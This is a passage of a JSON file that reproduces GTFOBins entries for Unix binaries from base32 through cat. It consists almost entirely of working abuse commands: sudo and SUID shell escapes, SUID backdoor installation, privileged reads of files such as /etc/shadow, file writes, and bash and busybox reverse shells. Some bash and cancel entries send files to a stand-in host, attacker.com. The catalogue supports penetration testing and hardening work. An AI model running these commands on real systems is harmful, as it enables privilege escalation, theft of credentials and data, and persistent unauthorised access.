                "function": "File read",
                "description": "It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.",
                "examples": [
                    {
                        "description": "",
                        "code": "LFILE=file_to_read\nbase32 \"$LFILE\" | base32 --decode"
                    }
                ]
            },
            {
                "function": "SUID",
                "description": "If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.\n\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.",
                "examples": [
                    {
                        "description": "",
                        "code": "sudo install -m =xs $(which base32) .\n\nLFILE=file_to_read\nbase32 \"$LFILE\" | base32 --decode"
                    }
                ]
            },
            {
                "function": "Sudo",
                "description": "If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",
                "examples": [
                    {
                        "description": "",
                        "code": "LFILE=file_to_read\nsudo base32 \"$LFILE\" | base32 --decode"
                    }
                ]
            }
        ]
    },
    {
        "name": "basenc",
        "url": "https://gtfobins.github.io/gtfobins/basenc/",
        "functions": [
            {
                "function": "File read",
                "description": "It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.",
                "examples": [
                    {
                        "description": "",
                        "code": "LFILE=file_to_read\nbasenc --base64 $LFILE | basenc -d --base64"
                    }
                ]
            },
            {
                "function": "SUID",
                "description": "If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.\n\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.",
                "examples": [
                    {
                        "description": "",
                        "code": "sudo install -m =xs $(which basenc) .\n\nLFILE=file_to_read\nbasenc --base64 $LFILE | basenc -d --base64"
                    }
                ]
            },
            {
                "function": "Sudo",
                "description": "If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",
                "examples": [
                    {
                        "description": "",
                        "code": "LFILE=file_to_read\nsudo basenc --base64 $LFILE | basenc -d --base64"
                    }
                ]
            }
        ]
    },
    {
        "name": "base58",
        "url": "https://gtfobins.github.io/gtfobins/base58/",
        "functions": [
            {
                "function": "File read",
                "description": "It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.",
                "examples": [
                    {
                        "description": "",
                        "code": "LFILE=file_to_read\nbase58 \"$LFILE\" | base58 --decode"
                    }
                ]
            },
            {
                "function": "Sudo",
                "description": "If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",
                "examples": [
                    {
                        "description": "",
                        "code": "LFILE=file_to_read\nsudo base58 \"$LFILE\" | base58 --decode"
                    }
                ]
            }
        ]
    },
    {
        "name": "bash",
        "url": "https://gtfobins.github.io/gtfobins/bash/",
        "functions": [
            {
                "function": "Shell",
                "description": "It can be used to break out from restricted environments by spawning an interactive system shell.",
                "examples": [
                    {
                        "description": "",
                        "code": "bash"
                    }
                ]
            },
            {
                "function": "Reverse shell",
                "description": "It can send back a reverse shell to a listening attacker to open a remote network access.",
                "examples": [
                    {
                        "description": "Run nc -l -p 12345 on the attacker box to receive the shell.",
                        "code": "export RHOST=attacker.com\nexport RPORT=12345\nbash -c 'exec bash -i &>/dev/tcp/$RHOST/$RPORT <&1'"
                    }
                ]
            },
            {
                "function": "File upload",
                "description": "It can exfiltrate files on the network.",
                "examples": [
                    {
                        "description": "Send local file in the body of an HTTP POST request. Run an HTTP service on the attacker box to collect the file.",
                        "code": "export RHOST=attacker.com\nexport RPORT=12345\nexport LFILE=file_to_send\nbash -c 'echo -e \"POST / HTTP/0.9\\n\\n$(<$LFILE)\" > /dev/tcp/$RHOST/$RPORT'"
                    },
                    {
                        "description": "Send local file using a TCP connection. Run nc -l -p 12345 > \"file_to_save\" on the attacker box to collect the file.",
                        "code": "export RHOST=attacker.com\nexport RPORT=12345\nexport LFILE=file_to_send\nbash -c 'cat $LFILE > /dev/tcp/$RHOST/$RPORT'"
                    }
                ]
            },
            {
                "function": "File download",
                "description": "It can download remote files.",
                "examples": [
                    {
                        "description": "Fetch a remote file via HTTP GET request.",
                        "code": "export RHOST=attacker.com\nexport RPORT=12345\nexport LFILE=file_to_get\nbash -c '{ echo -ne \"GET /$LFILE HTTP/1.0\\r\\nhost: $RHOST\\r\\n\\r\\n\" 1>&3; cat 0<&3; } \\\n    3<>/dev/tcp/$RHOST/$RPORT \\\n    | { while read -r; do [ \"$REPLY\" = \"$(echo -ne \"\\r\")\" ] && break; done; cat; } > $LFILE'"
                    },
                    {
                        "description": "Fetch remote file using a TCP connection. Run nc -l -p 12345 < \"file_to_send\" on the attacker box to send the file.",
                        "code": "export RHOST=attacker.com\nexport RPORT=12345\nexport LFILE=file_to_get\nbash -c 'cat < /dev/tcp/$RHOST/$RPORT > $LFILE'"
                    }
                ]
            },
            {
                "function": "File write",
                "description": "It writes data to files, it may be used to do privileged writes or write files outside a restricted file system.",
                "examples": [
                    {
                        "description": "",
                        "code": "export LFILE=file_to_write\nbash -c 'echo DATA > $LFILE'"
                    },
                    {
                        "description": "This adds timestamps to the output file.",
                        "code": "LFILE=file_to_write\nHISTIGNORE='history *'\nhistory -c\nDATA\nhistory -w $LFILE"
                    }
                ]
            },
            {
                "function": "File read",
                "description": "It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.",
                "examples": [
                    {
                        "description": "It trims trailing newlines and it’s not binary-safe.",
                        "code": "export LFILE=file_to_read\nbash -c 'echo \"$(<$LFILE)\"'"
                    },
                    {
                        "description": "The read file content is surrounded by the current history content.",
                        "code": "LFILE=file_to_read\nHISTTIMEFORMAT=$'\\r\\e[K'\nhistory -r $LFILE\nhistory"
                    }
                ]
            },
            {
                "function": "Library load",
                "description": "It loads shared libraries that may be used to run code in the binary execution context.",
                "examples": [
                    {
                        "description": "",
                        "code": "bash -c 'enable -f ./lib.so x'"
                    }
                ]
            },
            {
                "function": "SUID",
                "description": "If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.\n\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.",
                "examples": [
                    {
                        "description": "",
                        "code": "sudo install -m =xs $(which bash) .\n\n./bash -p"
                    }
                ]
            },
            {
                "function": "Sudo",
                "description": "If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",
                "examples": [
                    {
                        "description": "",
                        "code": "sudo bash"
                    }
                ]
            }
        ]
    },
    {
        "name": "basez",
        "url": "https://gtfobins.github.io/gtfobins/basez/",
        "functions": [
            {
                "function": "File read",
                "description": "It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.",
                "examples": [
                    {
                        "description": "",
                        "code": "LFILE=file_to_read\nbasez \"$LFILE\" | basez --decode"
                    }
                ]
            },
            {
                "function": "SUID",
                "description": "If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.\n\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.",
                "examples": [
                    {
                        "description": "",
                        "code": "sudo install -m =xs $(which basez) .\n\nLFILE=file_to_read\n./basez \"$LFILE\" | basez --decode"
                    }
                ]
            },
            {
                "function": "Sudo",
                "description": "If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",
                "examples": [
                    {
                        "description": "",
                        "code": "LFILE=file_to_read\nsudo basez \"$LFILE\" | basez --decode"
                    }
                ]
            }
        ]
    },
    {
        "name": "base64",
        "url": "https://gtfobins.github.io/gtfobins/base64/",
        "functions": [
            {
                "function": "File read",
                "description": "It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.",
                "examples": [
                    {
                        "description": "",
                        "code": "LFILE=file_to_read\nbase64 \"$LFILE\" | base64 --decode"
                    }
                ]
            },
            {
                "function": "SUID",
                "description": "If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.\n\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.",
                "examples": [
                    {
                        "description": "",
                        "code": "sudo install -m =xs $(which base64) .\n\nLFILE=file_to_read\n./base64 \"$LFILE\" | base64 --decode"
                    }
                ]
            },
            {
                "function": "Sudo",
                "description": "If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",
                "examples": [
                    {
                        "description": "",
                        "code": "LFILE=file_to_read\nsudo base64 \"$LFILE\" | base64 --decode"
                    }
                ]
            }
        ]
    },
    {
        "name": "bc",
        "url": "https://gtfobins.github.io/gtfobins/bc/",
        "functions": [
            {
                "function": "info",
                "description": "",
                "examples": [
                    {
                      "description": "The file content is actually parsed and appears as error messages, thus it might not be suitable to read arbitray binary files."
                    }
                ]
            },
            {
                "function": "File read",
                "description": "It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.",
                "examples": [
                    {
                        "description": "",
                        "code": "LFILE=file_to_read\nbc -s $LFILE\nquit"
                    }
                ]
            },
            {
                "function": "SUID",
                "description": "If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.\n\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.",
                "examples": [
                    {
                        "description": "",
                        "code": "sudo install -m =xs $(which bc) .\n\nLFILE=file_to_read\n./bc -s $LFILE\nquit"
                    }
                ]
            },
            {
                "function": "Sudo",
                "description": "If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",
                "examples": [
                    {
                        "description": "",
                        "code": "LFILE=file_to_read\nsudo bc -s $LFILE\nquit"
                    }
                ]
            }
        ]
    },
    {
        "name": "batcat",
        "url": "https://gtfobins.github.io/gtfobins/batcat/",
        "functions": [
            {
                "function": "info",
                "description": "",
                "examples": [
                    {
                      "description": "This invokes the default pager, which is likely to be less, other functions may apply. --paging always can be omitted provided that the output doesn’t fit the screen."
                    }
                ]
            },
            {
                "function": "Shell",
                "description": "It can be used to break out from restricted environments by spawning an interactive system shell.",
                "examples": [
                    {
                        "description": "",
                        "code": "batcat --paging always /etc/profile\n!/bin/sh"
                    }
                ]
            },
            {
                "function": "Sudo",
                "description": "If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",
                "examples": [
                    {
                        "description": "",
                        "code": "sudo batcat --paging always /etc/profile\n!/bin/sh"
                    }
                ]
            },
            {
                "function": "Limited SUID",
                "description": "If the binary has the SUID bit set, it may be abused to access the file system, escalate or maintain access with elevated privileges working as a SUID backdoor. If it is used to run commands (e.g., via system()-like invocations) it only works on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.\n\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.",
                "examples": [
                    {
                        "description": "",
                        "code": "sudo install -m =xs $(which batcat) .\n\n./batcat --paging always /etc/profile\n!/bin/sh"
                    }
                ]
            }
        ]
    },
    {
        "name": "bpftrace",
        "url": "https://gtfobins.github.io/gtfobins/bpftrace/",
        "functions": [
            {
                "function": "Sudo",
                "description": "If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",
                "examples": [
                    {
                        "description": "",
                        "code": "sudo bpftrace -e 'BEGIN {system(\"/bin/sh\");exit()}'"
                    },
                    {
                        "description": "",
                        "code": "TF=$(mktemp)\necho 'BEGIN {system(\"/bin/sh\");exit()}' >$TF\nsudo bpftrace $TF"
                    },
                    {
                        "description": "",
                        "code": "sudo bpftrace -c /bin/sh -e 'END {exit()}'"
                    }
                ]
            }
        ]
    },
    {
        "name": "bconsole",
        "url": "https://gtfobins.github.io/gtfobins/bconsole/",
        "functions": [
            {
                "function": "Shell",
                "description": "It can be used to break out from restricted environments by spawning an interactive system shell.",
                "examples": [
                    {
                        "description": "",
                        "code": "bconsole\n@exec /bin/sh"
                    }
                ]
            },
            {
                "function": "File read",
                "description": "It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.",
                "examples": [
                    {
                        "description": "The file is actually parsed and the first wrong line is returned in an error message, thus it may not be suitable for reading arbitrary files.",
                        "code": "bconsole -c /etc/shadow"
                    }
                ]
            },
            {
                "function": "Sudo",
                "description": "If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",
                "examples": [
                    {
                        "description": "",
                        "code": "sudo bconsole\n@exec /bin/sh"
                    }
                ]
            }
        ]
    },
    {
        "name": "bridge",
        "url": "https://gtfobins.github.io/gtfobins/bridge/",
        "functions": [
            {
                "function": "info",
                "description": "",
                "examples": [
                    {
                      "description": "Outputs the first line of the file (until the first whitespace) inside an error message to stdandard error."
                    }
                ]
            },
            {
                "function": "File read",
                "description": "It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.",
                "examples": [
                    {
                        "description": "",
                        "code": "LFILE=file_to_read\nbridge -b \"$LFILE\""
                    }
                ]
            },
            {
                "function": "SUID",
                "description": "If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.\n\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.",
                "examples": [
                    {
                        "description": "",
                        "code": "sudo install -m =xs $(which bridge) .\n\nLFILE=file_to_read\n./bridge -b \"$LFILE\""
                    }
                ]
            },
            {
                "function": "Sudo",
                "description": "If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",
                "examples": [
                    {
                        "description": "",
                        "code": "LFILE=file_to_read\nsudo bridge -b \"$LFILE\""
                    }
                ]
            }
        ]
    },
    {
        "name": "bundle",
        "url": "https://gtfobins.github.io/gtfobins/bundle/",
        "functions": [
            {
                "function": "Shell",
                "description": "It can be used to break out from restricted environments by spawning an interactive system shell.",
                "examples": [
                    {
                        "description": "This invokes the default pager, which is likely to be  less, other functions may apply.",
                        "code": "bundle help\n!/bin/sh"
                    },
                    {
                        "description": "",
                        "code": "export BUNDLE_GEMFILE=x\nbundle exec /bin/sh"
                    },
                    {
                        "description": "",
                        "code": "TF=$(mktemp -d)\ntouch $TF/Gemfile\ncd $TF\nbundle exec /bin/sh"
                    },
                    {
                        "description": "This spawns an interactive shell via irb.",
                        "code": "TF=$(mktemp -d)\ntouch $TF/Gemfile\ncd $TF\nbundle console\nsystem('/bin/sh -c /bin/sh')"
                    },
                    {
                        "description": "",
                        "code": "TF=$(mktemp -d)\necho 'system(\"/bin/sh\")' > $TF/Gemfile\ncd $TF\nbundle install"
                    }
                ]
            },
            {
                "function": "Sudo",
                "description": "If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",
                "examples": [
                    {
                        "description": "This invokes the default pager, which is likely to be  less, other functions may apply.",
                        "code": "sudo bundle help\n!/bin/sh"
                    }
                ]
            }
        ]
    },
    {
        "name": "bundler",
        "url": "https://gtfobins.github.io/gtfobins/bundler/",
        "functions": [
            {
                "function": "Shell",
                "description": "It can be used to break out from restricted environments by spawning an interactive system shell.",
                "examples": [
                    {
                        "description": "This invokes the default pager, which is likely to be  less, other functions may apply.",
                        "code": "bundler help\n!/bin/sh"
                    },
                    {
                        "description": "",
                        "code": "export BUNDLE_GEMFILE=x\nbundler exec /bin/sh"
                    },
                    {
                        "description": "",
                        "code": "TF=$(mktemp -d)\ntouch $TF/Gemfile\ncd $TF\nbundler exec /bin/sh"
                    },
                    {
                        "description": "This spawns an interactive shell via irb.",
                        "code": "TF=$(mktemp -d)\ntouch $TF/Gemfile\ncd $TF\nbundler console\nsystem('/bin/sh -c /bin/sh')"
                    },
                    {
                        "description": "",
                        "code": "TF=$(mktemp -d)\necho 'system(\"/bin/sh\")' > $TF/Gemfile\ncd $TF\nbundler install"
                    }
                ]
            },
            {
                "function": "Sudo",
                "description": "If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",
                "examples": [
                    {
                        "description": "This invokes the default pager, which is likely to be  less, other functions may apply.",
                        "code": "sudo bundler help\n!/bin/sh"
                    }
                ]
            }
        ]
    },
    {
        "name": "busybox",
        "url": "https://gtfobins.github.io/gtfobins/busybox/",
        "functions": [
            {
                "function": "info",
                "description": "",
                "examples": [
                    {
                      "description": "BusyBox may contain many UNIX utilities, run busybox --list-full to check what GTFOBins binaries are supported. Here some example."
                    }
                ]
            },
            {
                "function": "Shell",
                "description": "It can be used to break out from restricted environments by spawning an interactive system shell.",
                "examples": [
                    {
                        "description": "",
                        "code": "busybox sh"
                    }
                ]
            },
            {
                "function": "Reverse shell",
                "description": "It can send back a reverse shell to a listening attacker to open a remote network access.",
                "examples": [
                    {
                        "description": "Run nc -lvp 12345 on the attacker box to receive the shell.",
                        "code": "RHOST=attacker.com\nRPORT=12345\nbusybox nc -e /bin/sh $RHOST $RPORT"
                    }
                ]
            },
            {
                "function": "File upload",
                "description": "It can exfiltrate files on the network.",
                "examples": [
                    {
                        "description": "Serve files in the local folder running an HTTP server.",
                        "code": "LPORT=12345\nbusybox httpd -f -p $LPORT -h ."
                    }
                ]
            },
            {
                "function": "File write",
                "description": "It writes data to files, it may be used to do privileged writes or write files outside a restricted file system.",
                "examples": [
                    {
                        "description": "",
                        "code": "LFILE=file_to_write\nbusybox sh -c 'echo \"DATA\" > $LFILE'"
                    }
                ]
            },
            {
                "function": "File read",
                "description": "It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.",
                "examples": [
                    {
                        "description": "",
                        "code": "LFILE=file_to_read\n./busybox cat \"$LFILE\""
                    }
                ]
            },
            {
                "function": "SUID",
                "description": "If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.\n\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.",
                "examples": [
                    {
                        "description": "It may drop the SUID privileges depending on the compilation flags and the runtime configuration.",
                        "code": "sudo install -m =xs $(which busybox) .\n\n./busybox sh"
                    }
                ]
            },
            {
                "function": "Sudo",
                "description": "If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",
                "examples": [
                    {
                        "description": "",
                        "code": "sudo busybox sh"
                    }
                ]
            }
        ]
    },
    {
        "name": "byebug",
        "url": "https://gtfobins.github.io/gtfobins/byebug/",
        "functions": [
            {
                "function": "Shell",
                "description": "It can be used to break out from restricted environments by spawning an interactive system shell.",
                "examples": [
                    {
                        "description": "",
                        "code": "TF=$(mktemp)\necho 'system(\"/bin/sh\")' > $TF\nbyebug $TF\ncontinue"
                    }
                ]
            },
            {
                "function": "Sudo",
                "description": "If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",
                "examples": [
                    {
                        "description": "",
                        "code": "TF=$(mktemp)\necho 'system(\"/bin/sh\")' > $TF\nsudo byebug $TF\ncontinue"
                    }
                ]
            },
            {
                "function": "Limited SUID",
                "description": "If the binary has the SUID bit set, it may be abused to access the file system, escalate or maintain access with elevated privileges working as a SUID backdoor. If it is used to run commands (e.g., via system()-like invocations) it only works on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.\n\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.",
                "examples": [
                    {
                        "description": "",
                        "code": "sudo install -m =xs $(which byebug) .\n\nTF=$(mktemp)\necho 'system(\"/bin/sh\")' > $TF\n./byebug $TF\ncontinue"
                    }
                ]
            }
        ]
    },
    {
        "name": "busctl",
        "url": "https://gtfobins.github.io/gtfobins/busctl/",
        "functions": [
            {
                "function": "Shell",
                "description": "It can be used to break out from restricted environments by spawning an interactive system shell.",
                "examples": [
                    {
                        "description": "This invokes the default pager, which is likely to be less, other functions may apply.",
                        "code": "busctl --show-machine\n!/bin/sh"
                    },
                    {
                        "description": "",
                        "code": "busctl set-property org.freedesktop.systemd1 /org/freedesktop/systemd1 org.freedesktop.systemd1.Manager LogLevel s debug --address=unixexec:path=/bin/sh,argv1=-c,argv2='/bin/sh -i 0<&2 1>&2'"
                    }
                ]
            },
            {
                "function": "SUID",
                "description": "If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.\n\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.",
                "examples": [
                    {
                        "description": "",
                        "code": "sudo install -m =xs $(which busctl) .\n\n./busctl set-property org.freedesktop.systemd1 /org/freedesktop/systemd1 org.freedesktop.systemd1.Manager LogLevel s debug --address=unixexec:path=/bin/sh,argv1=-pc,argv2='/bin/sh -p -i 0<&2 1>&2'"
                    }
                ]
            },
            {
                "function": "Sudo",
                "description": "If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",
                "examples": [
                    {
                        "description": "",
                        "code": "sudo busctl set-property org.freedesktop.systemd1 /org/freedesktop/systemd1 org.freedesktop.systemd1.Manager LogLevel s debug --address=unixexec:path=/bin/sh,argv1=-c,argv2='/bin/sh -i 0<&2 1>&2'"
                    }
                ]
            }
        ]
    },
    {
        "name": "bzip2",
        "url": "https://gtfobins.github.io/gtfobins/bzip2/",
        "functions": [
            {
                "function": "info",
                "description": "",
                "examples": [
                    {
                      "description": "There are also a number of other utilities that rely on bzip2 under the hood, e.g., bzless, bzcat, bunzip2, etc. Besides having similar features, they also allow privileged reads if bzip2 itself is SUID."
                    }
                ]
            },   
            {
                "function": "File read",
                "description": "It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.",
                "examples": [
                    {
                        "description": "",
                        "code": "LFILE=file_to_read\nbzip2 -c $LFILE | bzip2 -d"
                    }
                ]
            },
            {
                "function": "SUID",
                "description": "If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.\n\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.",
                "examples": [
                    {
                        "description": "",
                        "code": "sudo install -m =xs $(which bzip2) .\n\nLFILE=file_to_read\n./bzip2 -c $LFILE | bzip2 -d"
                    }
                ]
            },
            {
                "function": "Sudo",
                "description": "If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",
                "examples": [
                    {
                        "description": "",
                        "code": "LFILE=file_to_read\nsudo bzip2 -c $LFILE | bzip2 -d"
                    }
                ]
            }
        ]
    },
    {
        "name": "cabal",
        "url": "https://gtfobins.github.io/gtfobins/cabal/",
        "functions": [
            {
                "function": "Shell",
                "description": "It can be used to break out from restricted environments by spawning an interactive system shell.",
                "examples": [
                    {
                        "description": "",
                        "code": "cabal exec -- /bin/sh"
                    }
                ]
            },
            {
                "function": "SUID",
                "description": "If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.\n\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.",
                "examples": [
                    {
                        "description": "",
                        "code": "sudo install -m =xs $(which cabal) .\n\n./cabal exec -- /bin/sh -p"
                    }
                ]
            },
            {
                "function": "Sudo",
                "description": "If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",
                "examples": [
                    {
                        "description": "",
                        "code": "sudo cabal exec -- /bin/sh"
                    }
                ]
            }
        ]
    },
    {
        "name": "c89",
        "url": "https://gtfobins.github.io/gtfobins/c89/",
        "functions": [
            {
                "function": "Shell",
                "description": "It can be used to break out from restricted environments by spawning an interactive system shell.",
                "examples": [
                    {
                        "description": "",
                        "code": "c89 -wrapper /bin/sh,-s ."
                    }
                ]
            },
            {
                "function": "File write",
                "description": "It writes data to files, it may be used to do privileged writes or write files outside a restricted file system.",
                "examples": [
                    {
                        "description": "",
                        "code": "LFILE=file_to_delete\nc89 -xc /dev/null -o $LFILE"
                    }
                ]
            },
            {
                "function": "File read",
                "description": "It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.",
                "examples": [
                    {
                        "description": "",
                        "code": "LFILE=file_to_read\nc89 -x c -E \"$LFILE\""
                    }
                ]
            },
            {
                "function": "Sudo",
                "description": "If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",
                "examples": [
                    {
                        "description": "",
                        "code": "sudo c89 -wrapper /bin/sh,-s ."
                    }
                ]
            }
        ]
    },
    {
        "name": "cancel",
        "url": "https://gtfobins.github.io/gtfobins/cancel/",
        "functions": [
            {
                "function": "File upload",
                "description": "It can exfiltrate files on the network.",
                "examples": [
                    {
                        "description": "Send local file using a TCP connection. Run nc -l -p 12345 > \"file_to_save\" on the attacker box to collect the file.",
                        "code": "RHOST=attacker.com\nRPORT=12345\nLFILE=file_to_send\ncancel -u \"$(cat $LFILE)\" -h $RHOST:$RPORT"
                    }
                ]
            }
        ]
    },
    {
        "name": "c99",
        "url": "https://gtfobins.github.io/gtfobins/c99/",
        "functions": [
            {
                "function": "Shell",
                "description": "It can be used to break out from restricted environments by spawning an interactive system shell.",
                "examples": [
                    {
                        "description": "",
                        "code": "c99 -wrapper /bin/sh,-s ."
                    }
                ]
            },
            {
                "function": "File write",
                "description": "It writes data to files, it may be used to do privileged writes or write files outside a restricted file system.",
                "examples": [
                    {
                        "description": "",
                        "code": "LFILE=file_to_delete\nc99 -xc /dev/null -o $LFILE"
                    }
                ]
            },
            {
                "function": "File read",
                "description": "It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.",
                "examples": [
                    {
                        "description": "",
                        "code": "LFILE=file_to_read\nc99 -x c -E \"$LFILE\""
                    }
                ]
            },
            {
                "function": "Sudo",
                "description": "If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",
                "examples": [
                    {
                        "description": "",
                        "code": "sudo c99 -wrapper /bin/sh,-s ."
                    }
                ]
            }
        ]
    },
    {
        "name": "capsh",
        "url": "https://gtfobins.github.io/gtfobins/capsh/",
        "functions": [
            {
                "function": "Shell",
                "description": "It can be used to break out from restricted environments by spawning an interactive system shell.",
                "examples": [
                    {
                        "description": "",
                        "code": "capsh --"
                    }
                ]
            },
            {
                "function": "SUID",
                "description": "If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.\n\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.",
                "examples": [
                    {
                        "description": "",
                        "code": "sudo install -m =xs $(which capsh) .\n\n./capsh --gid=0 --uid=0 --"
                    }
                ]
            },
            {
                "function": "Sudo",
                "description": "If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",
                "examples": [
                    {
                        "description": "",
                        "code": "sudo capsh --"
                    }
                ]
            }
        ]
    },
    {
        "name": "cat",
        "url": "https://gtfobins.github.io/gtfobins/cat/",
        "functions": [
            {
                "function": "File read",
                "description": "It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.",
                "examples": [
                    {
                        "description": "",
                        "code": "LFILE=file_to_read\ncat \"$LFILE\""
                    }
                ]
            },
            {
                "function": "SUID",
                "description": "If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.\n\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.",
                "examples": [
                    {
                        "description": "",
                        "code": "sudo install -m =xs $(which cat) .\n\nLFILE=file_to_read\n./cat \"$LFILE\""
                    }
                ]
            },
            {
                "function": "Sudo",
                "description": "If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",
                "examples": [
                    {
                        "description": "",
